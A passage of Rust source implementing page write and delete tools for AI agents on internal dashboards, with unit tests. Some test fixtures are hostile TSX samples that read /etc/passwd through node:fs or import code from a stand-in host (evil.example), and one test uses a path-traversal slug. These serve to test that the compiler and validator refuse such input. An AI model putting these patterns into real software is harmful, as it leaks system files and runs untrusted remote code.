    /// binary node named `name` under `parent_id` when there is none yet.
    async fn write_or_create_binary(
        &self,
        parent_id: &str,
        existing: Option<WorkspaceNode>,
        name: &str,
        bytes: &[u8],
        origin: WorkspaceOrigin,
    ) -> crate::Result<()> {
        match existing {
            Some(node) => {
                self.store
                    .write_binary(&self.company, &node.id, bytes, Some(COMPILED_MIME), origin)
                    .await?;
                Ok(())
            }
            None => {
                let node = WorkspaceNode {
                    id: crate::ports::generate_id(),
                    name: name.to_string(),
                    kind: NodeKind::File,
                    parent_id: Some(parent_id.to_string()),
                    updated_at_millis: crate::ports::now_millis(),
                    created_by: origin.clone(),
                    updated_by: origin,
                    mime: Some(COMPILED_MIME.to_string()),
                    size: None,
                    sha256: None,
                    adopted: false,
                };
                self.store
                    .create_binary(&self.company, &node, bytes)
                    .await?;
                Ok(())
            }
        }
    }
}

// ---------------------------------------------------------------------------
// pages_delete
// ---------------------------------------------------------------------------

/// Removes one page's whole bundle: its folder and everything in it.
pub struct PagesDeleteTool {
    pages: CompanyPages,
}

impl PagesDeleteTool {
    fn new(pages: CompanyPages) -> Self {
        Self { pages }
    }
}

#[async_trait]
impl Tool for PagesDeleteTool {
    fn name(&self) -> &str {
        PAGES_DELETE_TOOL
    }

    fn description(&self) -> &str {
        "Permanently remove one internal dashboard page and everything in it, by `slug`. This \
         cannot be undone."
    }

    fn parameters_schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "slug": {
                    "type": "string",
                    "description": "The page's slug, as shown by pages_list."
                }
            },
            "required": ["slug"],
            "additionalProperties": false
        })
    }

    fn permission_level(&self) -> PermissionLevel {
        PermissionLevel::Write
    }

    async fn execute(&self, args: Value) -> anyhow::Result<ToolResult> {
        let Some(slug) = args.get("slug").and_then(Value::as_str).map(str::trim) else {
            return Ok(ToolResult::error(
                "Invalid arguments: `slug` is required.".to_string(),
            ));
        };
        if !valid_slug(slug) {
            return Ok(ToolResult::error(format!("Invalid `slug`: \"{slug}\".")));
        }

        let bundle = match self.pages.page(slug).await {
            Ok(bundle) => bundle,
            Err(e) => {
                return Ok(ToolResult::error(format!(
                    "Could not look up the page `{slug}`: {reason}.",
                    reason = store_reason(&e),
                )));
            }
        };
        let Some(folder_id) = bundle.and_then(|b| b.folder_id) else {
            return Ok(ToolResult::error(format!(
                "No page named `{slug}`. Call `{PAGES_LIST_TOOL}` to see what exists."
            )));
        };

        match self
            .pages
            .store
            .delete(&self.pages.company, &folder_id)
            .await
        {
            Ok(true) => Ok(ToolResult::success(format!(
                "Deleted the page `{slug}` and everything in it."
            ))),
            Ok(false) => Ok(ToolResult::error(format!(
                "The page `{slug}` was already gone."
            ))),
            Err(e) => Ok(ToolResult::error(format!(
                "Could not delete `{slug}`: {reason}.",
                reason = store_reason(&e),
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// Wiring
// ---------------------------------------------------------------------------

/// Builds the pages tool set for one agent.
///
/// Unlike [`crate::harness::workspace_tools::workspace_tools`], there is no
/// `can_write` split: per the design, `pages` rides the default `"*"` grant
/// whole, so whoever gets any pages tool gets all four. The gate is applied
/// one layer up, in `build_agent`, by whether `pages` is granted at all.
pub fn pages_tools(
    store: Arc<dyn WorkspaceStore>,
    company: CompanyId,
    agent_id: String,
) -> Vec<Box<dyn Tool>> {
    let pages = CompanyPages::new(store, company, agent_id);
    vec![
        Box::new(PagesListTool::new(pages.clone())),
        Box::new(PagesReadTool::new(pages.clone())),
        Box::new(PagesWriteTool::new(pages.clone())),
        Box::new(PagesDeleteTool::new(pages)),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::store::FsOps;

    const TEST_AGENT: &str = "page-builder";

    fn pages(store: Arc<dyn WorkspaceStore>, company: &str) -> CompanyPages {
        CompanyPages::new(store, CompanyId::new(company), TEST_AGENT.to_string())
    }

    async fn store() -> (tempfile::TempDir, Arc<dyn WorkspaceStore>) {
        let dir = tempfile::tempdir().expect("tempdir");
        let ops: Arc<dyn WorkspaceStore> = Arc::new(FsOps::new(dir.path()));
        (dir, ops)
    }

    const VALID_TSX: &str = r#"
import * as React from "react";

export default function Page() {
  return <div className="card">Hello from the page</div>;
}
"#;

    const DISALLOWED_IMPORT_TSX: &str = r#"
import fs from "node:fs";

export default function Page() {
  return <div>{fs.readFileSync("/etc/passwd")}</div>;
}
"#;

    const DYNAMIC_IMPORT_TSX: &str = r#"
import * as React from "react";

export default function Page() {
  const lazy = import("https://evil.example/x.js");
  return <div>{lazy}</div>;
}
"#;

    const EXPORT_FROM_TSX: &str = r#"
import * as React from "react";
export { React as R } from "https://evil.example/x.js";

export default function Page() {
  return <div>hi</div>;
}
"#;

    const EXPORT_ALL_TSX: &str = r#"
export * from "https://evil.example/x.js";
"#;

    #[test]
    fn compiling_valid_tsx_produces_a_jsx_runtime_call() {
        let compiled = compile_page(VALID_TSX).expect("compiles");
        assert!(
            compiled.code.contains("jsx") || compiled.code.contains("_jsx"),
            "expected an automatic-runtime jsx call in the output, got:\n{}",
            compiled.code
        );
        assert!(
            compiled.code.contains("react/jsx-runtime"),
            "expected the automatic runtime import in the output, got:\n{}",
            compiled.code
        );
    }

    #[test]
    fn compiling_a_disallowed_import_is_refused() {
        let err = compile_page(DISALLOWED_IMPORT_TSX).expect_err("must be refused");
        assert!(
            err.contains("node:fs"),
            "expected the diagnostic to name the disallowed import, got: {err}"
        );
    }

    #[test]
    fn compiling_a_dynamic_import_is_refused() {
        let err = compile_page(DYNAMIC_IMPORT_TSX).expect_err("must be refused");
        assert!(
            err.contains("https://evil.example"),
            "expected the diagnostic to name the dynamic import, got: {err}"
        );
    }

    #[test]
    fn compiling_a_reexport_is_refused() {
        for (label, src) in [
            ("export * from", EXPORT_ALL_TSX),
            ("export … from", EXPORT_FROM_TSX),
        ] {
            let err = compile_page(src).expect_err("must be refused");
            assert!(
                err.contains("https://evil.example"),
                "{label}: expected the diagnostic to name the re-export, got: {err}"
            );
        }
    }

    #[tokio::test]
    async fn pages_write_with_a_stale_expected_updated_at_is_refused_and_writes_nothing() {
        let (_dir, store) = store().await;
        let pages = pages(store, "acme");
        let write = PagesWriteTool::new(pages.clone());
        write
            .execute(json!({
                "slug": "revenue",
                "title": "Revenue",
                "source": VALID_TSX,
            }))
            .await
            .expect("initial write ok");

        let bundle = pages
            .page("revenue")
            .await
            .expect("read ok")
            .expect("exists");
        let rev = bundle.source.expect("source node").updated_at_millis;

        // A stale revision must be refused and leave the source untouched.
        let result = write
            .execute(json!({
                "slug": "revenue",
                "source": VALID_TSX,
                "expected_updated_at": rev + 1,
            }))
            .await
            .expect("execute ok");
        assert!(result.is_error, "a CAS mismatch must be refused");
        let after = pages
            .page("revenue")
            .await
            .expect("read ok")
            .expect("exists");
        assert_eq!(
            after.source.expect("source node").updated_at_millis,
            rev,
            "a refused CAS write must not bump or alter the source"
        );

        // The matching revision still succeeds.
        let ok = write
            .execute(json!({
                "slug": "revenue",
                "source": VALID_TSX,
                "expected_updated_at": rev,
            }))
            .await
            .expect("execute ok");
        assert!(!ok.is_error, "a matching CAS write should succeed");
    }

    #[tokio::test]
    async fn pages_delete_removes_the_whole_page() {
        let (_dir, store) = store().await;
        let pages = pages(store, "acme");
        let write = PagesWriteTool::new(pages.clone());
        write
            .execute(json!({ "slug": "temp", "title": "Temp", "source": VALID_TSX }))
            .await
            .expect("write ok");
        assert!(pages.page("temp").await.expect("read ok").is_some());

        let delete = PagesDeleteTool::new(pages.clone());
        let result = delete
            .execute(json!({ "slug": "temp" }))
            .await
            .expect("execute ok");
        assert!(!result.is_error, "delete should succeed");
        assert!(pages.page("temp").await.expect("read ok").is_none());
    }

    #[tokio::test]
    async fn pages_delete_of_an_unknown_slug_is_an_error_and_creates_nothing() {
        let (_dir, store) = store().await;
        let pages = pages(store, "acme");
        let delete = PagesDeleteTool::new(pages.clone());

        let result = delete
            .execute(json!({ "slug": "nope" }))
            .await
            .expect("execute ok");
        assert!(
            result.is_error,
            "deleting a page that does not exist must be refused, got: {result:?}"
        );
        assert!(
            !result.output().contains("panic"),
            "the refusal is a clean tool error: {result:?}"
        );
    }

    #[tokio::test]
    async fn pages_write_over_an_existing_page_without_expected_updated_at_is_refused() {
        let (_dir, store) = store().await;
        let pages = pages(store, "acme");
        let write = PagesWriteTool::new(pages.clone());
        write
            .execute(json!({
                "slug": "revenue",
                "title": "Revenue",
                "source": VALID_TSX,
            }))
            .await
            .expect("initial write ok");
        let rev = pages
            .page("revenue")
            .await
            .expect("read ok")
            .expect("exists")
            .source
            .expect("source node")
            .updated_at_millis;

        // Overwriting existing source without the CAS token must be refused
        // rather than silently clobbering what the agent has not re-read.
        let result = write
            .execute(json!({
                "slug": "revenue",
                "source": "export default function Revenue() { return <h1>x</h1>; }",
            }))
            .await
            .expect("execute ok");
        assert!(
            result.is_error,
            "an overwrite without `expected_updated_at` must be refused"
        );
        assert!(
            result
                .output()
                .contains("`expected_updated_at` is required"),
            "the refusal names the missing token: {result:?}"
        );

        let after = pages
            .page("revenue")
            .await
            .expect("read ok")
            .expect("exists");
        assert_eq!(
            after.source.expect("source node").updated_at_millis,
            rev,
            "a refused write must not alter the source"
        );
    }

    #[tokio::test]
    async fn pages_write_then_read_round_trips_the_source_and_compiles() {
        let (_dir, store) = store().await;
        let pages = pages(store, "acme");
        let tool_pages = pages.clone();
        let write = PagesWriteTool::new(tool_pages);
        let result = write
            .execute(json!({
                "slug": "revenue",
                "title": "Revenue",
                "source": VALID_TSX,
            }))
            .await
            .expect("execute ok");
        assert!(!result.is_error, "write should succeed: {result:?}");

        let bundle = pages
            .page("revenue")
            .await
            .expect("read ok")
            .expect("exists");
        assert!(bundle.manifest.is_some());
        assert!(bundle.source.is_some());
        assert!(bundle.compiled.is_some());
        let (_, compiled_bytes) = pages
            .store
            .read_bytes(&pages.company, &bundle.compiled.unwrap().id)
            .await
            .expect("read ok")
            .expect("compiled node exists");
        use futures::StreamExt;
        let mut chunks = Vec::new();
        let mut stream = compiled_bytes;
        while let Some(chunk) = stream.next().await {
            chunks.extend_from_slice(&chunk.expect("chunk"));
        }
        let compiled_text = String::from_utf8(chunks).expect("utf8");
        assert!(compiled_text.contains("react/jsx-runtime"));
    }

    #[tokio::test]
    async fn pages_write_with_a_disallowed_import_writes_nothing() {
        let (_dir, store) = store().await;
        let pages = pages(store, "acme");
        let write = PagesWriteTool::new(pages.clone());
        let result = write
            .execute(json!({
                "slug": "bad",
                "title": "Bad",
                "source": DISALLOWED_IMPORT_TSX,
            }))
            .await
            .expect("execute ok");
        assert!(result.is_error, "write should be refused");

        let bundle = pages.page("bad").await.expect("read ok");
        assert!(bundle.is_none(), "nothing should have been written");
    }

    #[test]
    fn slug_validation_accepts_and_rejects_the_expected_shapes() {
        assert!(valid_slug("revenue"));
        assert!(valid_slug("revenue-overview-2"));
        assert!(!valid_slug(""));
        assert!(!valid_slug("Revenue"));
        assert!(!valid_slug("-revenue"));
        assert!(!valid_slug("revenue/../secrets"));
        assert!(!valid_slug("revenue overview"));
    }
}
